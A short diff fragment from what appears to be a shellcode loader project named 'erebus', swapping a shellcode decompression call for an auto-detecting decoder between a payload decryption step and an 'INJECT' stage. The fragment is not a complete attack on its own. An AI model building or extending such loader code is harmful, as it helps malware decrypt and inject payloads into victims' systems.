@@ -48,7 +48,7 @@ VOID entry(void) {
         erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
     }
 
-    erebus::DecompressShellcode(&pPayload, &shellcode_size);
+    erebus::AutoDetectAndDecode(&pPayload, &shellcode_size);
 
     // ============================================================
     // 5. INJECT
